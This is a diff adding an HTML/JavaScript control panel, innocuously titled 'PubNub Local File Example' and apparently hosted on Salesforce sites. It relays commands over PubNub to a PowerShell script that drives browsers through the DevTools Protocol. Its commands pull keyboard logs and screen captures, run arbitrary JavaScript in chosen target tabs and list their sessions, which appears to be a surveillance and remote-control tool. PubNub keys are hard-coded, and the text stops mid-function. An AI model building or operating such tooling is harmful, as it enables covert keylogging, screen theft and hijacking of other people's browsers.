@@ -1,0 +1,1323 @@
+<!-- 20261014-1129 -->
+
+<!-- https://orgfarm-bd12a2161b-dev-ed.my.salesforce-sites.com/services/apexrest/StorageVault/pubnub_client -->
+<!-- https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/client_pubnub -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>PubNub Local File Example</title>
+
+    <style>
+        body {
+            /* Sets a clean, standard fixed-width font stack */
+            font-family: ui-monospace, SFMono-Regular, Consolas, "Liberation Mono", Menlo, monospace;
+        }
+
+        .large-textbox {
+            /* Sets the initial large rectangle size */
+            width: 100%;
+            max-width: 400px;
+            height: 100px;
+            
+            /* Applies the monospace font styling */
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 16px;
+            
+            /* Ensures the box is resizable both horizontally and vertically */
+            resize: both; 
+            overflow: auto;
+            
+            /* Optional styling for a cleaner look */
+            padding: 12px;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box; 
+        }
+
+        .code-input {
+            /* Enforce monospace font */
+            font-family: 'Courier New', Courier, monospace;
+            
+            resize: both; 
+            
+            width: 400px;
+            height: 100px;
+            min-width: 50px;
+            min-height: 10px;
+          }
+          
+          .collapsed {
+            display: none;
+          }
+
+    </style>
+
+    <script src="https://cdn.pubnub.com/sdk/javascript/pubnub.12.0.3.min.js"></script>
+</head>
+<body>
+    <h1>PubNub Message Publisher</h1>
+
+    <table>
+        <tr>
+            <td><label for="pubnub_subscriber_key">PubNub Subscriber Key:</label></td>
+            <td style="width: 300px;">
+                <input style="width: 100%;" type="text" id="pubnub_subscriber_key" name="pubnub_subscriber_key">
+            </td>
+        </tr>
+        <tr>
+            <td><label for="pubnub_publisher_key">PubNub Publisher Key:</label></td>
+            <td style="width: 300px;">
+                <input style="width: 100%;" type="text" id="pubnub_publisher_key" name="pubnub_publisher_key">
+            </td>
+        </tr>
+        <tr>
+            <td><label for="pubnub_uuid">PubNub UUID:</label></td>
+            <td style="width: 300px;">
+                <input style="width: 100%;" type="text" id="pubnub_uuid" name="pubnub_uuid">
+            </td>
+        </tr>
+        <tr>
+            <td><label for="pubnub_channel">PubNub Channel:</label></td>
+            <td style="width: 300px;">
+                <input style="width: 100%;" type="text" id="pubnub_channel" name="pubnub_channel">
+            </td>
+        </tr>
+        <tr>
+
+        </tr>
+    </table>
+
+    <br/>
+
+    <!-- message body -->
+    <div>
+        <table>
+            <tr>
+                <td>
+                    <label for="messages">Messages:</label>
+                    <select id="messages" name="messages">
+                        <option value="SendTestMessage">SendTestMessage</option>
+                        <option value="GetFrontendUrls">GetFrontendUrls</option>
+                        <option value="GetScreenCapture">GetScreenCapture</option>
+                        <option value="GetKeyboardLog">GetKeyboardLog</option>
+                        <option value="GetSystemOverview">GetSystemOverview</option>
+                        <option value="GetClientCommands">GetClientCommands</option>
+                    </select>              
+                </td>
+                <td>
+                    <button onclick="writeMessage(createBuiltInCmd(document.getElementById('messages').value));">Write Message</button></br></br>
+                </td>
+                <td>
+                    <button onclick="sendMessageStr(document.getElementById('message_body').value)">Send Message</button></br></br>
+                </td>
+                <td>
+                    <button onclick="document.getElementById('message_body').value=''">Clear Message</button></br></br>
+                </td>
+            </tr>
+        </table>
+        <textarea id="message_body" class="large-textbox" placeholder="Type your monospace text here..."></textarea></br>
+        
+    </div>
+
+    <br/>
+    <br/>
+
+    <!-- issue CDP commands to target  -->
+    <div>
+        <table>
+            <tr>
+                <td>Targets:</td>
+                <td>
+                    <select id="targetIdList" name="targetIdList" onchange="handleTargetIdChange(this);">
+                    </select>                  
+                </td>
+            </tr>
+            <tr>
+                <td>
+                    Target ID:
+                </td>
+                <td>
+                    <input type="hidden" id="targetId" value="">
+                    <input type="text" id="targetIdText" onchange="handleTargetIdChange(this);">
+                </td>
+            </tr>
+            <tr>
+                <td>Session ID:</td>
+                <td id="targetSessionId">
+                </td>
+            </tr>
+            <tr>
+                <td>Title:</td>
+                <td id="targetTitle">
+                </td>
+            </tr>
+            <tr>
+                <td>URL:</td>
+                <td id="targetURL">
+                </td>
+            </tr>
+            <tr>
+                <td>devtoolsFrontendUrl:</td>
+                <td id="targetDebugURL">
+                </td>
+            </tr>
+            <tr>
+                <td>
+                    Command:
+                </td>
+                <td>
+                    <select id="cmdname" name="cmdname" onchange="handleCmdnameChange(this);">
+                        <option value="ExecEvaluate">ExecEvaluate</option>                        
+                        <option value="GetTargetText">GetTargetText</option>
+                        <option value="GetTargetHTML">GetTargetHTML</option>
+                        <option value="GetTargetScreenCapture">GetTargetScreenCapture</option>
+                        <option value="LoadQueue">LoadQueue</option>
+                        <option value="RefreshDOM">RefreshDOM</option>
+                    </select>
+                </td>
+            </tr>
+            <tr>
+                <td colspan="2">
+                    <textarea id="evaluateCmd" class="code-input" placeholder="Type your code here..."></textarea>
+                </td>
+            </tr>
+        </table>
+        <table>
+            <tr>
+                <td style="text-align: right;"><input type="button" value="Execute" onclick="executeTargetCmd();"></td>
+                <td><input type="button" value="Clear" onclick="document.getElementById('evaluateCmd').value='';"></td>
+                <td>
+                    <input type="button" value="GetBoundingRect" onclick="insertJSCode('GetBoundingRect');">
+                </td>
+            </tr>
+        </table>
+
+    </div>
+
+    <br/>
+
+    <!-- screen capture -->
+    <div id="screen_capture">
+
+    </div>
+
+    <br/>
+
+    <!-- DOM explorer -->
+    <table border="1">
+        <tr>
+            <th>DOM (
+            <a href="javascript:void(0);" onclick="collapseTable('resultsList');">Collapse</a> |                
+            <a href="javascript:void(0);" onclick="expandTable('resultsList');">Expand</a> |
+            <a href="javascript:void(0);" onclick="clearTable('domList');">Clear</a> )</th>
+        </tr>
+    </table>
+
+    <table id="domList">
+    </table>
+
+
+    <br/>
+    <br/>
+    
+    <!-- results -->
+    <table border="1">
+        <tr>
+            <th>Results (
+            <a href="javascript:void(0);" onclick="collapseTable('resultsList');">Collapse</a> |                
+            <a href="javascript:void(0);" onclick="expandTable('resultsList');">Expand</a> |
+            <a href="javascript:void(0);" onclick="clearTable('resultsList');">Clear</a> )</th>
+        </tr>
+    </table>
+
+    <table id="resultsList">
+    </table>
+
+
+    <br/>
+    <br/>
+
+    <!-- targets -->
+
+    <table border="1">
+        <tr>
+            <th>Targets (
+            <a href="javascript:void(0);" onclick="collapseTable('targetsList');">Collapse</a> |                
+            <a href="javascript:void(0);" onclick="expandTable('targetsList');">Expand</a> |
+            <a href="javascript:void(0);" onclick="clearTable('targetsList');">Clear</a> |
+            <a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('GetTargets'));">Get Targets</a> |
+            <a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('RefreshTargets'));">Refresh Targets</a>
+            )</th>
+        </tr>
+    </table>
+
+    <br/>
+
+    <table id="targetsList">
+    </table>
+
+    <br/>
+    <br/>
+    
+    <!-- commands -->
+    <table border="1">
+        <tr>
+            <th>Commands (
+            <a href="javascript:void(0);" onclick="collapseTable('commandsList');">Collapse</a> |                
+            <a href="javascript:void(0);" onclick="expandTable('commandsList');">Expand</a> |
+            <a href="javascript:void(0);" onclick="sendMessage(createBuiltInCmd('GetClientCommands'));">Get Commands</a> |
+            <a href="javascript:void(0);" onclick="clearTable('commandsList');">Clear</a> )
+        </th>
+        </tr>
+    </table>
+
+    <table id="commandsList" border="1">
+    </table>
+
+    <br/>
+    <br/>
+
+    <!-- pb messages -->
+     
+    <table border="1">
+        <tr>
+            <th style="text-align: left;">
+                Messages ( 
+                    <a href="javascript:void(0);" onclick="expandTable('messagesTable');">Expand</a> | 
+                    <a href="javascript:void(0);" onclick="collapseTable('messagesTable');">Collapse</a> | 
+                    <a href="javascript:void(0);" onclick="clearTable('messagesTable');">Clear</a> |
+                    <a href="javascript:void(0);" onclick="refreshMessages();">Refresh</a> )
+            </th>
+        </tr>
+        <tr>
+            <td>
+                <label for="messagesInbound">Inbound Messages:</label>
+                <input type="checkbox" id="messagesInbound" name="messagesInbound" value="messagesInbound" onchange="toggleMessages();">
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <label for="messagesOutbound">Outbound Messages:</label>
+                <input type="checkbox" id="messagesOutbound" name="messagesOutbound" value="messagesOutbound" onchange="toggleMessages();">
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <label for="messagesBroadcast">Broadcast Messages:</label>
+                <input type="checkbox" id="messagesBroadcast" name="messagesBroadcast" value="messagesBroadcast" onchange="toggleMessages();">
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <label for="messagesCDPRelay">CDP Relay Messages:</label>
+                <input type="checkbox" id="messagesCDPRelay" name="messagesCDPRelay" value="messagesCDPRelay" onchange="toggleMessages();">
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <label for="messagesSource">Source:</label>
+                <input type="text" id="messagesSource" onchange="toggleMessages();">
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <label for="messagesDestination">Destination:</label>
+                <input type="text" id="messagesDestination" onchange="toggleMessages();">
+            </td>
+        </tr>
+        
+    </table>
+
+    <table id="messagesTable" border="1">
+        <tr>
+        </tr>
+    </table>
+ 
+    <!-- populate/refresh/update ui -->
+    <script>
+        function updateTargetId() {
+            let targetId = getTargetId()
+
+            document.getElementById('targetId').value = targetId;
+            document.getElementById('targetIdList').value = targetId;
+            document.getElementById('targetIdText').value = targetId;
+        }
+
+        function getTargetId() {
+            let telem = document.getElementById('targetId');
+            let targetId = telem.value;
+
+            if ( !targetId || !targetId.trim() ) {
+                targetId = document.getElementById('targetIdText').value;
+            }
+
+            if ( !targetId || !targetId.trim() ) {
+                targetId = document.getElementById('targetIdList').value;
+            }
+
+            return targetId;
+        }
+
+        function navigateDebug() {
+            let elem = document.getElementById('devtoolsFrontendUrl');
+            let fullUrl = elem.value;
+            const urlObj = new URL(fullUrl);
+            const relativeUrl = urlObj.pathname + urlObj.search + urlObj.hash;
+
+            document.getElementById('processCDPUrl').value = 'https://orgfarm-bd12a2161b-dev-ed.develop.my.salesforce-sites.com/services/apexrest/StorageVault/processcdp'+relativeUrl;
+        }
+
+        function refreshMessages(messages) {
+
+            let opts = getOpts();
+
+            if ( ! messages || messages.length == 0 ) {
+                logmsg("messages list empty or null");
+                return;
+            }
+
+            clearTable('messagesTable');
+
+            for ( let i = 0; i<messages.length; i++) {
+                let msg = messages[i];
+
+                let addmsg = showMessage(msg);
+
+                if ( addmsg ) {
+                    addMessage(msg);
+                }
+
+            }
+        }
+
+        function isNullOrWhitespace(value) {
+            return (
+                value === null ||
+                value === undefined ||
+                typeof value !== "string" ||
+                value.trim().length === 0
+            );
+        }
+
+        function showMessage(msg) {
+            let opts = getOpts();
+
+            let addmsg = false;
+
+            if ( opts.broadcast && msg.message.destination == 'BROADCAST' ) {
+                addmsg = true;
+            } else if ( opts.inbound && msg.message.destination == 'client_pubnub.html' ) {
+                addmsg = true;
+            } else if ( opts.outbound && msg.message.source == 'client_pubnub.html' ) {
+                addmsg = true;
+            } else if ( opts.cdprelay && msg.message.builtincmd == 'ProcessCDP' ) {
+                addmsg = true;
+            }
+
+            let source = opts.source;
+            let destination = opts.destination;
+
+            if ( ! isNullOrWhitespace(source) ) {
+                if ( source != msg.message.source ) {
+                    addmsg = false;
+                }
+            }
+
+            if ( ! isNullOrWhitespace(destination) ) {
+                if ( destination != msg.message.destination ) {
+                    addmsg = false;
+                }
+            }
+
+            return addmsg;
+        }
+
+        function addMessage(message) {
+            
+            if ( ! showMessage(message) ) {
+                return;
+            }
+
+            const table = document.getElementById("messagesTable");
+            const tbody = table.createTBody();
+
+            let insertrow = (key, item) => {
+                let newRow = tbody.insertRow(-1);
+
+                let newCell = newRow.insertCell(0);
+                newCell.textContent = key;
+
+                newCell = newRow.insertCell(1);
+                let txt = JSON.stringify(item, null, 2);
+
+                if ( txt.startsWith('"') && txt.endsWith('"') ) {
+                    txt = txt.slice(1, -1);
+                }
+
+                newCell.textContent = txt;
+            };
+
+            let objStack = [];
+
+            objStack.push( {name:'ROOT', payload:message, path:''} );
+
+            while ( objStack.length > 0 ) {
+                let mobj = objStack.pop()
+                let objName = mobj['name'];
+                let obj = mobj['payload'];
+                let path = mobj['path'];
+                
+                insertrow(path + '.' + objName, '[---------]');
+
+                if ( obj == null ) {
+                    console.log('[8JH4] error');
+                    obj = null;
+                }
+
+                let keys = Object.getOwnPropertyNames(obj);
+
+                for ( let i=0; i<keys.length; i++) {
+                    let key = keys[i];
+                    let item = obj[key];
+
+                    if ( item != null && typeof item == 'object' ) {
+                        objStack.push( {name:'['+key+']', payload:item, path:path+'.'+objName} );
+                        continue;
+                    }
+
+                    insertrow(key, item);
+                }
+
+            }
+
+            newRow = tbody.insertRow(-1);
+            newCell = newRow.insertCell();
+            newCell.textContent = '-------------------- ';
+            newCell.style.backgroundColor = "grey"; 
+            newCell.colSpan = 2;
+        }
+        
+        function refreshTargets(targets) {
+            refreshTargetsTable(targets);
+            refreshTargetIdList(targets);
+        }
+
+        function addTarget(target) {
+
+            const table = document.getElementById("targetsList");
+            const tbody = table.createTBody();
+
+            let insertrow = (key, item) => {
+                let newRow = tbody.insertRow(-1);
+
+                let newCell = newRow.insertCell(0);
+                newCell.textContent = key;
+
+                newCell = newRow.insertCell(1);
+                let txt = JSON.stringify(item, null, 2);
+
+                if ( txt.startsWith('"') && txt.endsWith('"') ) {
+                    txt = txt.slice(1, -1);
+                }
+
+                newCell.textContent = txt;
+            };
+
+            let keys = Object.getOwnPropertyNames(target);
+
+            let objStack = [];
+
+            objStack.push( {name:'ROOT', payload:target, path:''} );
+
+            while ( objStack.length > 0 ) {
+                let mobj = objStack.pop()
+                let objName = mobj['name'];
+                let obj = mobj['payload'];
+                let path = mobj['path'];
+                
+                insertrow(path + '.' + objName, '[---------]');
+
+                if ( obj == null ) {
+                    console.log('[8JH4] error');
+                }
+
+                let keys = Object.getOwnPropertyNames(obj);
+
+                for ( let i=0; i<keys.length; i++) {
+                    let key = keys[i];
+                    let item = obj[key];
+
+                    if ( item != null && typeof item == 'object' ) {
+                        objStack.push( {name:'['+key+']', payload:item, path:path+'.'+objName} );
+                        continue;
+                    }
+
+                    insertrow(key, item);
+                }
+
+            }
+
+            newRow = tbody.insertRow(-1);
+            newCell = newRow.insertCell();
+            newCell.textContent = '-------------------- ';
+            newCell.style.backgroundColor = "grey"; 
+            newCell.colSpan = 2;
+        }
+
+        function refreshTargetsTable(targets) {
+            
+            clearTable('targetsList');
+            
+            for ( let i = 0; i<targets.length; i++) {
+                let target = targets[i];
+
+                addTarget(target);
+            }
+
+        }
+
+        function addCommand(table, command) {
+
+            // const table = document.getElementById("commandsList");
+            const tbody = table.createTBody();
+
+            let insertrow = (key, item, bgcolor) => {
+                let newRow = tbody.insertRow(-1);
+                
+                if ( bgcolor ) {
+                    newRow.style.backgroundColor = bgcolor;
+                }
+
+                let newCell = newRow.insertCell(0);
+                newCell.textContent = key;
+
+                newCell = newRow.insertCell(1);
+                let txt = JSON.stringify(item, null, 2);
+
+                if ( txt.startsWith('"') && txt.endsWith('"') ) {
+                    txt = txt.slice(1, -1);
+                }
+
+                newCell.textContent = txt;
+            };
+
+            let objStack = [];
+
+            objStack.push( {name:'ROOT', payload:command, path:'', bgcolor:"#696969"} );
+
+            while ( objStack.length > 0 ) {
+                let mobj = objStack.pop()
+                let objName = mobj['name'];
+                let obj = mobj['payload'];
+                let path = mobj['path'];
+                let bgcolor = mobj['bgcolor'];
+
+                insertrow(path + '.' + objName, '[---------]', bgcolor);
+
+                let keys = Object.getOwnPropertyNames(obj);
+
+                for ( let i=0; i<keys.length; i++) {
+                    let key = keys[i];
+                    let item = obj[key];
+
+                    if ( item != null && typeof item == 'object' ) {
+                        objStack.push( {name:'['+key+']', payload:item, path:path+'.'+objName, bgcolor:"#FFA500"} );
+                        continue;
+                    }
+
+                    insertrow(key, item);
+                }
+
+            }
+
+        }
+
+        function refreshCommandsTable(commands) {
+            LogMsg('refreshCommandsTable');
+
+            const table = document.getElementById("commandsList");
+            const existingTbodys = table.querySelectorAll("tbody");
+            existingTbodys.forEach(tbody => tbody.remove());
+            
+            commands.forEach( command => {
+                addCommand(table, command);
+            });
+            
+        }
+
+        function refreshTargetIdList(targets) {
+            console.log('refreshTargetIdList');
+
+            let dropdown = document.getElementById('targetIdList');
+            dropdown.options.length = 0;
+
+            targets.forEach( target => {
+                console.log(target);
+
+                const newOption = document.createElement("option");
+
+                newOption.text = target.targetId;
+                newOption.value = target.targetId;
+              
+                dropdown.add(newOption);    
+            });
+
+            document.getElementById('targetIdList').options[0].selected = true;
+
+            handleTargetIdChange(document.getElementById('targetIdList'));
+        }
+
+        function handleTargetIdChange(elem) {
+            console.log('handleTargetIdChange: '+elem.value);
+
+            let targetid = elem.value;
+
+            let telem = document.getElementById('targetId');
+            telem.value = elem.value;
+
+            telem = document.getElementById('targetIdText');
+            telem.value = elem.value;
+
+            telem = document.getElementById('targetIdList');
+            telem.value = elem.value;
+
+            let target = targetslist.find(target => {
+                return target.targetId == targetid; 
+            });
+
+            let sessionid = target.sessionId;
+            let title = target.title;
+            let url = target.url;
+            let debugurl = target.devtoolsFrontendUrl;
+
+            telem = document.getElementById('targetSessionId');
+            telem.innerText = sessionid;
+
+            telem = document.getElementById('targetTitle');
+            telem.innerText = title;
+
+            telem = document.getElementById('targetURL');
+            telem.innerText = url;
+
+            telem = document.getElementById('targetDebugURL');
+            telem.innerText = debugurl;
+        }
+
+        function handleCmdnameChange(elem) {
+            // console.log('handleCmdnameChange');
+            console.log('handleCmdnameChange: '+elem.value);
+        }
+
+        function addResult(result) {
+            const table = document.getElementById("resultsList");
+            const tbody = table.createTBody();
+
+            let insertrow = (key, item, bgcolor) => {
+                let newRow = tbody.insertRow(-1);
+                
+                if ( bgcolor ) {
+                    newRow.style.backgroundColor = bgcolor;
+                }
+
+                let newCell = newRow.insertCell(0);
+                newCell.textContent = key;
+
+                newCell = newRow.insertCell(1);
+                let txt = JSON.stringify(item, null, 2);
+
+                if ( txt.startsWith('"') && txt.endsWith('"') ) {
+                    txt = txt.slice(1, -1);
+                }
+
+                newCell.textContent = txt;
+            };
+
+            let objStack = [];
+
+            objStack.push( {name:'ROOT', payload:result, path:'', bgcolor:"#696969"} );
+
+            while ( objStack.length > 0 ) {
+                let mobj = objStack.pop()
+                let objName = mobj['name'];
+                let obj = mobj['payload'];
+                let path = mobj['path'];
+                let bgcolor = mobj['bgcolor'];
+
+                insertrow(path + '.' + objName, '[---------]', bgcolor);
+
+                let keys = Object.getOwnPropertyNames(obj);
+
+                for ( let i=0; i<keys.length; i++) {
+                    let key = keys[i];
+                    let item = obj[key];
+
+                    if ( item != null && typeof item == 'object' ) {
+                        objStack.push( {name:'['+key+']', payload:item, path:path+'.'+objName, bgcolor:"#FFA500"} );
+                        continue;
+                    }
+
+                    insertrow(key, item);
+                }
+
+            }
+
+        }
+
+        function collapseTable(tableid) {
+            let telem = document.getElementById(tableid);
+            telem.classList.add("collapsed");
+        }
+
+        function expandTable(tableid) {
+            let telem = document.getElementById(tableid);
+            telem.classList.remove("collapsed");
+        }
+
+        function clearTable(tableid) {
+            const table = document.getElementById(tableid);
+
+            table.querySelectorAll('tbody').forEach(tbody => tbody.remove());
+        }
+
+        function refreshTable(tableid, items) {
+
+            clearTable(tableid);
+
+            const table = document.getElementById(tableid);
+
+            if ( ! Array.isArray(items) ) {
+                items = [ items ];
+            }
+
+            items.forEach( item => {
+                addItem(table, item);
+            });
+            
+            // iterate through table rows,
+            // convert row with backendNodeId
+            // to link DOM.describeNode
+
+        }
+
+        function addItem(table, result) {
+            const tbody = table.createTBody();
+
+            let insertrow = (key, item, bgcolor) => {
+                let newRow = tbody.insertRow(-1);
+                
+                if ( bgcolor ) {
+                    newRow.style.backgroundColor = bgcolor;
+                }
+
+                let newCell = newRow.insertCell(0);
+                newCell.textContent = key;
+
+                newCell = newRow.insertCell(1);
+                let txt = JSON.stringify(item, null, 2);
+
+                if ( txt.startsWith('"') && txt.endsWith('"') ) {
+                    txt = txt.slice(1, -1);
+                }
+
+                newCell.textContent = txt;
+            };
+
+            let objStack = [];
+
+            objStack.push( {name:'ROOT', payload:result, path:'', bgcolor:"#696969"} );
+
+            while ( objStack.length > 0 ) {
+                let mobj = objStack.pop()
+                let objName = mobj['name'];
+                let obj = mobj['payload'];
+                let path = mobj['path'];
+                let bgcolor = mobj['bgcolor'];
+
+                insertrow(path + '.' + objName, '[---------]', bgcolor);
+
+                let keys = Object.getOwnPropertyNames(obj);
+
+                for ( let i=0; i<keys.length; i++) {
+                    let key = keys[i];
+                    let item = obj[key];
+
+                    if ( item != null && typeof item == 'object' ) {
+                        objStack.push( {name:'['+key+']', payload:item, path:path+'.'+objName, bgcolor:"#FFA500"} );
+                        continue;
+                    }
+
+                    insertrow(key, item);
+                }
+
+            }
+        }
+
+        function getOpts() {
+            let inbound = document.getElementById('messagesInbound');
+            let outbound = document.getElementById('messagesOutbound'); 
+            let broadcast = document.getElementById('messagesBroadcast'); 
+            let cdprelay = document.getElementById('messagesCDPRelay');
+            let source = document.getElementById('messagesSource');
+            let destination = document.getElementById('messagesDestination');
+
+            let opts = {
+                "inbound":inbound.checked,
+                "outbound":outbound.checked,
+                "broadcast":broadcast.checked,
+                "cdprelay":cdprelay.checked,
+                "source":source,
+                "destination":destination
+            };
+
+            return opts;
+        }
+
+        function toggleMessages() {
+            let opts = getOpts();
+
+            refreshMessages(messagelist, opts);
+        }
+
+        function insertJSCode(jscodename) {
+            let jscodestr = jscodelist[jscodename];
+
+            let elem = document.getElementById('evaluateCmd');
+            elem.value = jscodestr;
+        }
+
+    </script>
+
+    <!-- logger + utility funcs -->
+    <script>
+        if ( ! Object.hasOwn ) {
+			Object.hasOwn = (obj, prop) => Object.prototype.hasOwnProperty.call(obj, prop);
+		}
+
+        function getRandomCode(n=8) {
+            let base = 10**(n-1);
+            let top = 10*base;
+            return Math.floor(base + Math.random() * (top-base));
+        }
+
+        let logmsg_index=0
+
+        function ErrorToJson(err) {
+
+            if ( ! err instanceof Error) {
+                return '';
+            }
+    
+            let jsonstr = JSON.stringify(err, (key, val) => {
+
+                if (val instanceof Error) {
+                    return {
+                        name: val.name,
+                        message: val.message,
+                        stack: val.stack,
+                    };
+                }
+
+                return val;
+            });
+
+            return jsonstr;
+        }
+
+        function LogMsg(msg) {
+
+            try {
+                msgstr = '';
+
+                if ( msg instanceof Error ) {
+                    msgstr = ErrorToJson(msg);
+                } else if ( typeof msg === 'string' || msg instanceof String ) {
+                    msgstr = msg;
+                } else {
+                    try { msgstr = JSON.stringify(msg); } catch { }
+                }
+                
+                logmsg_index++;
+                console.log('[client_pubnub.html]|['+logmsg_index+']|'+msgstr);
+            } catch (e) {
+                // discard exception
+            }
+        }
+
+        var logmsg = LogMsg;
+
+                /* 
+        messageEvent.message
+            actualChannel: "clientid_88992233_JS_client"
+            channel: "clientid_88992233_JS_client"
+            message: {msgstr: "ping -- 15:48:40.175"}
+            publisher: "user-717"
+            subscribedChannel: "clientid_88992233_JS_client"
+            subscription: "clientid_88992233_JS_client"
+            timetoken: "17900201204555720"
+        */
+        function MessageToPayload(messageEvent, type, tmsgindex) {
+
+            // const keys = Object.getOwnPropertyNames(messageEvent).filter( (p) => typeof messageEvent[p] === 'string' );
+
+            const eventObj = { ...messageEvent }; 
+
+            if( Object.hasOwn(eventObj, 'message') )
+                delete eventObj.message;
+
+            let payload = { type: type, event: eventObj, message:messageEvent.message, ts:Date.now(), msgindex:tmsgindex };
+
+            return payload;
+        }
+    </script>
+
+    <!-- globals + pubnub -->
+    <script>
+
+        let jscodelist = {
+            "GetBoundingRect":`(() => {
+
+                let coords = elem.getBoundingClientRect()
+                let x_pos = (coords.left + coords.right) / 2;
+                let y_pos = (coords.top + coords.bottom) / 2;
+                
+                return { "x_pos":x_pos, "y_pos":y_pos };
+                
+                })();`
+        };
+
+        let msgindex = 1;
+        let messagelist = [];
+
+        let commandslist = [];
+        let targetslist = [];
+
+        let pubnubconfig = {
+            publishKey: "pub-c-bd83b994-1964-4760-9bf2-142ceadf7f66",
+            subscribeKey: "sub-c-62ba6c3d-b786-4be3-a033-e472ab227774",
+            userId: "client_pubnub.html"
+        };
+
+        const pubnub = new PubNub(pubnubconfig);
+
+        const client_channel = 'clientid_88992233_JS_client';
+        
+		pubnub.addListener({
+            status: function(statusEvent) {
+				if (window.onPubNubEvent) {
+                    try {
+                        let payload = MessageToPayload(statusEvent, 'PubNubStatus', -1);
+                        let payloadjson = JSON.stringify(payload);
+
+                        window.onPubNubEvent(JSON.stringify(payload));
+                    } catch (e) {
+                        logmsg(e);
+                    }				}
+			
+                if (statusEvent.category === "PNConnectedCategory") {
+                    logmsg("PubNub Status Notification -- Successfully connected locally!");
+                }
+            },
+            
+			presence: function(messageEvent) {
+				if (window.onPubNubEvent) {
+					window.onPubNubEvent(JSON.stringify({ type: 'presence', data: messageEvent }));
+				}
+			},
+
+            // internally generated messages get bounced here as well
+            message: function(messageEvent) {
+                console.log("PubNub message received:", messageEvent);
+                
+                try {
+                    addMessage(messageEvent);
+                    processMessage(messageEvent);
+
+                    let payload = MessageToPayload(messageEvent, 'PubNubMessage', msgindex++);
+
+                    messagelist.push(payload);
+
+                    let payloadjson = JSON.stringify(payload);
+                    
+                    // function is defined via CDP command issued by PS1 script --> Runtime.addBinding
+                    if (window.onPubNubEvent) {
+                        window.onPubNubEvent(payloadjson); // delivers message to relay PS1 script running in background
+                    }
+
+                } catch (ex) {
+                    logmsg(ex);
+                }
+            }
+
+        });
+
+        pubnub.subscribe({
+            channels: [client_channel]
+        });        
+
+        try {
+            let elem = null;
+            elem = document.getElementById('pubnub_channel');
+            elem.value = client_channel;
+
+            elem = document.getElementById('pubnub_subscriber_key');
+            elem.value = pubnubconfig.subscribeKey;
+
+            elem = document.getElementById('pubnub_publisher_key');
+            elem.value = pubnubconfig.publishKey;
+
+            elem = document.getElementById('pubnub_uuid');
+            elem.value = pubnubconfig.userId;
+        } catch (err) {
+            LogMsg(err);
+        }
+
+        setInterval(() => {
+            let payload = createBuiltInCmd('SendBroadcast');
+            payload.destination = 'BROADCAST';
+            sendMessage(payload);
+        }, 30000);
+
+        setInterval(() => {
+            logmsg('ping ' + getRandomCode(8));
+        }, 5000);
+
+    </script>
+
+    <!-- inbound/outbound messaging -->
+    <script>
+        
+        function createBuiltInCmd(cmdname) {
+
+            let payload = { 
+                builtincmd: cmdname,
+                source: "client_pubnub.html",
+                destination: "pscdp.relay.ps1",
+                cmdid: getRandomCode(8),
+                ts: Date.now()
+            };
+
+            return payload;
+        }
+
+        function writeMessage(payload) {
+            let elem = document.getElementById('message_body');
+            elem.value = JSON.stringify(payload);
+        }
+
+        function sendMessageStr(jsonstr) {
+            let obj = JSON.parse(jsonstr);
+            sendMessage(obj);
+        }
+
+        function sendMessage(payload) {
+            if ( payload.destination != 'BROADCAST' && payload.destination != 'client_pubnub.html' ) {
+                writeMessage(payload);
+            }
+
+            pubnub.publish({
+                message: payload,
+                channel: client_channel
+            }, (status, response) => {
+                if (status.error) {
+                    payload.error = status;
+                    LogMsg("Publish failed: " + status.toJSON());
+                } else {
+                    payload.response = response;
+                    LogMsg("Message published successfully with timetoken:" + response.timetoken);
+                }
+            });
+        }
+
+        function processMessage(messageEvent) {
+
+            let message = messageEvent.message;
+
+
+            if ( message.destination != 'client_pubnub.html' ) {
+                return;
+            } else if ( message.builtincmd == 'BROADCAST' ) {
+                return;
+            }
+
+            let cmdfuncname = "process_" + message.builtincmd;
+            let cmdfunc = null;
+
+            if (typeof window[cmdfuncname] === "function") {
+                cmdfunc = window[cmdfuncname];
+            } else {
+                throw new Error(`built in cmd name does not exist ${cmdfuncname}`)
+            }
+
+            try {
+                return cmdfunc(message.result, message);
+            } catch (ex) {
+                logmsg(ex);
+            }
+
+        }
+
+        screencapture_chunks=[];
+
+        function process_GetTargetScreenCapture(result, message) {
+            // anchor
+            let chunkcount = message['chunkcount']
+            let chunksize = message['chunksize']
+            let chunkindex = message['chunkindex']
+            let remainderlength = message['remainderlength']
+            let imagedata = result['imagedata']
+            
+            screencapture_chunks.push({
+                chunkcount:chunkcount,
+                chunksize:chunksize,
+                chunkindex:chunkindex,
+                remainderlength:remainderlength,
+                imagedata:imagedata
+            });
+
+            if ( chunkindex == chunkcount - 1 ) {
+                combineChunks();
+            }
+        }
+
+        function combineChunks() {
+            console.log('combineChunks');
+
+            screencapture_chunks.sort((a, b) => Number(a.chunkindex) - Number(b.chunkindex));
+
+            let imagestr = '';
+            
+            for ( let i = 0; i<screencapture_chunks.length;i++) {
+                imagestr += screencapture_chunks[i].imagedata;
+            }
+
+            screencapture_chunks = [];
+
+            const containerDiv = document.getElementById('screen_capture');
+
+            const base64String = 'data:image/png;base64,'+imagestr;
+
+            const img = document.createElement('img');
+
+            img.src = base64String;
+            img.alt = 'Inserted Base64 Image';
+
+            containerDiv.appendChild(img);
+        }
+
+        function process_RefreshTargets(result) {
+            let targets = result;
+            refreshTargets(targets);
+        }
+
+        function process_GetTargetText(result) {
+            console.log('GetTargetText');
+            // TODO implement -- show text in ui
+        }
+
+        function process_GetClientCommands(result) {
+            refreshCommandsTable(result);
+        }
+
+        function process_GetTargetHTML(result) {        
+            logmsg('GetTargetHTML');        
+        }
+
+        function process_RefreshDOM(result) {
+
+            result = atob(result);
+
+            try {
+                result = JSON.parse(result);
+            } catch (ex) {
+                logmsg(ex);
+            }
+
+            result = result || {};
+
+            refreshTable('domList', result);
+        }
+
+        function process_GetFrontendUrls(result) {
+
+            if (Array.isArray(result) && result.length > 0) {
+                result = result[0];
+            }
+
+            document.getElementById('devtoolsFrontendUrl').value = result.devtoolsFrontendUrl;
+        }
+
+        function process_GetTargets(result) {
